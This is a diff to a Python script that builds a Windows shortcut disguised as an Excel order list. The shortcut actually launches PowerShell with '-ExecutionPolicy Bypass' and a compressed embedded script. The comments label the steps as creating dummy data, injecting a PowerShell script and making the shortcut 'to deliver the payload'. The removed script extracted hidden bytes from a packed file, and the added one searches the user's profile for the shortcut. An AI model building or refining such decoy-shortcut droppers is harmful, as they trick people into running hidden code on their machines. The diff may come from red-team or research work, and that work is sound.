@@ -70,6 +70,8 @@ def create_lnk_shortcut(shortcut_path: str, target_path: str, arguments: str = '
         shortcut = shell.CreateShortcut(shortcut_path)
         shortcut.TargetPath = target_path
         shortcut.Arguments = arguments
+        print(f"shortcut.TargetPath: {shortcut.TargetPath}")
+        print(f"shortcut.Arguments: {shortcut.Arguments}")
         shortcut.WorkingDirectory = working_directory if working_directory else os.path.dirname(target_path)
         if icon_path:
             shortcut.IconLocation = icon_path
@@ -95,6 +97,7 @@ def get_powershell_path() -> str:
     sys.exit(1)
 
 if __name__ == "__main__":
+    ## Step 1: Create the dummy data
     # Define data paths (use absolute paths for reliability)
     data_paths = [
         os.path.abspath("../asset/KnightShopOrderList.xlsx"),      # Benign Excel file
@@ -108,48 +111,26 @@ if __name__ == "__main__":
         print(f"Error: {output_path} was not created.")
         sys.exit(1)
 
+    ## Step 2: Create the PowerShell script
     # Injected PowerShell Script Content
     ps1_content = f"""
-if (-not (Test-Path "$env:Public\\Downloads")) {{
-    New-Item -Path "$env:Public" -Name "Downloads" -ItemType "directory"
+$targetFileName = 'KnightShopOrderList.lnk'
+
+$searchDir = $env:USERPROFILE
+
+$lnkPath = Get-ChildItem -Path $searchDir -Recurse -Filter $targetFileName -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DirectoryName
+
+if ($lnkPath) {{
+    Write-Output $lnkPath
+}} else {{
+    Write-Output 'Shortcut not found.'
 }}
-
-# Get the script's directory
-$scriptPath = Get-Location
-Write-Host "Script path: $scriptPath"
-
-# Check if input file exists
-$filePath = Join-Path $scriptPath "{os.path.basename(output_path)}"
-if (-not (Test-Path $filePath)) {{
-    Write-Host "Error: File not found at $filePath" -ForegroundColor Red
-    exit -1
-}}
-
-# Open the binary file for reading
-$fs = [System.IO.File]::OpenRead($filePath)
-$br = New-Object System.IO.BinaryReader($fs)
-
-# First file is the Excel sheet
-$excel_path = Join-Path $scriptPath "outputfromdummy.xlsx"
-$data = $br.ReadBytes({offsets.get(data_paths[1], 0)})
-Write-Host "Data length read: $($data.Length)"
-if ($data.Length -eq 0) {{
-    Write-Host "Error: No data read from the file." -ForegroundColor Red
-    exit -1
-}}
-
-# Write the Excel file
-[System.IO.File]::WriteAllBytes($excel_path, $data)
-Write-Host "Excel file saved to: $excel_path"
-
-# Close file handles
-$br.Close()
-$fs.Close()
 """
 
     # Compress the PowerShell script
     compressed_ps1 = compress_powershell_script(ps1_content)
 
+    ## Step 3: Create the lnk shortcut file to deliver the payload
     # Create the lnk shortcut file
     try:
         current_directory = os.path.dirname(os.path.abspath(__file__))
@@ -160,14 +141,13 @@ $fs.Close()
     shortcut_path = os.path.join(current_directory, shortcut_name)
     powershell_path = get_powershell_path()
     arguments = f'-ExecutionPolicy Bypass -NoExit -Command "{compressed_ps1}"'
-    working_directory = current_directory  # Changed from os.path.expanduser("~")
-    icon_path = powershell_path  # Optionally, you can set a custom icon
+    working_directory = current_directory
+    icon_path = powershell_path 
 
     # Create the lnk file shortcut
     create_lnk_shortcut(
         shortcut_path=shortcut_path,
         target_path=powershell_path,
         arguments=arguments,
-        working_directory=working_directory,  # Updated
         icon_path=icon_path
     )
